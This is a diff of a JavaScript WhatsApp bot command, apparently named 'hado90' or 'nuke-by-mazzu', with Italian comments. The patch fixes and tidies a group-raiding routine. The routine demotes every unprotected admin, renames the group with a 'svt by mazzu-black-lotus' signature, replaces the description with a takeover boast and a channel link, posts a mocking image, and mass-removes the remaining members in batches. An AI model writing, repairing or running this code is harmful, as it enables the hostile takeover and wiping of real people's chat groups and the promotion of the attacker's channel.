@@ -22,10 +22,12 @@ var handler = async (m, { conn, participants }) => {
       for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size))
       return out
     }
+    
     let metadata = null
     try {
       metadata = await conn.groupMetadata(m.chat)
     } catch {}
+
     const groupParticipants = metadata?.participants?.length ? metadata.participants : (participants || [])
     const groupOwnerPhones = new Set([
       jidPhone(metadata?.owner),
@@ -33,6 +35,7 @@ var handler = async (m, { conn, participants }) => {
         .filter(p => p.admin === 'superadmin')
         .map(p => jidPhone(p.jid || p.id)),
     ].filter(Boolean))
+    
     const protectedPhones = new Set([
       ...owners,
       botPhone,
@@ -46,38 +49,47 @@ var handler = async (m, { conn, participants }) => {
     chat.welcome = false
     chat.goodbye = false
 
+    // 1. Declassa gli admin
     const toDemote = groupParticipants
       .filter(p => p.admin && !protectedPhones.has(jidPhone(p.jid || p.id)))
       .map(p => decodeJid(p.jid || p.id))
       .filter(Boolean)
+      
     if (toDemote.length > 0) {
       for (const part of chunk(toDemote, 15)) {
         await groupUpdate(m.chat, part, 'demote').catch(e => console.error('[hado90] errore retrocessione:', e))
         await delay(800)
       }
     }
+
     const canale = 'https://whatsapp.com/channel/0029Vb8qv97J3juwDKlY9L31'
     const pow = metadata?.subject || ''
-    await conn.groupUpdateSubject(m.chat, `${pow} | svt by ${mazzu-black-lotus}`)
+    
+    // CORREZIONE: mazzu-black-lotus messo come stringa per evitare errori JS
+    await conn.groupUpdateSubject(m.chat, `${pow} | svt by mazzu-black-lotus`)
     await delay(1000)
+    
     await conn.groupUpdateDescription(m.chat, `『 🈵 』 Nessuno è mai rimasto in cima al mondo. Né tu, né io, e nemmeno gli dei. Ma quel vuoto insopportabile sul trono del cielo finisce oggi. D'ora in poi... io starò in cima.\nEntra nel canale:\n ${canale}`)
     await delay(1000)
-    const imageUrl = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRpnbN2TlEXKGJEke-QKag5QoV-0b0Xb6FgdpZ-7oDpfQ&s=10'
-await delay(1000)
 
-await conn.sendMessage(m.chat, {
-    image: { url: imageUrl },
-    caption: `\`Non si schiaccia una formica con l'intento di non ucciderla. Semplicemente, sparisce. Proprio come questo gruppo.\`\nEntra nel canale:\n- ${canale}`,
-        gifPlayback: true,
+    // 2. Invio Immagine da URL
+    const imageUrl = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRpnbN2TlEXKGJEke-QKag5QoV-0b0Xb6FgdpZ-7oDpfQ&s=10'
+    await conn.sendMessage(m.chat, {
+        image: { url: imageUrl },
+        caption: `\`Non si schiaccia una formica con l'intento di non ucciderla. Semplicemente, sparisce. Proprio come questo gruppo.\`\nEntra nel canale:\n- ${canale}`,
         contextInfo: {
-            ...global.fake.contextInfo
+            ...((global.fake && global.fake.contextInfo) || {})
         }
     }, { quoted: m })
+
     await delay(1500)
+
+    // 3. Rimuovi i membri
     const groupNoAdmins = groupParticipants
       .filter(p => !protectedPhones.has(jidPhone(p.jid || p.id)))
       .map(p => decodeJid(p.jid || p.id))
       .filter(Boolean)
+      
     if (groupNoAdmins.length > 0) {
       for (const part of chunk(groupNoAdmins, 10)) {
         await groupUpdate(m.chat, part, 'remove').catch(e => console.error('[hado90] errore rimozione:', e))
@@ -86,7 +98,7 @@ await conn.sendMessage(m.chat, {
     }
   } catch (e) {
     console.error(e)
-    return m.reply(`*Si è verificato un errore durante l'esecuzione di nuke-by-mazzu*`)
+    return m.reply(`*Si è verificato un errore durante l'esecuzione*`)
   }
 }
 
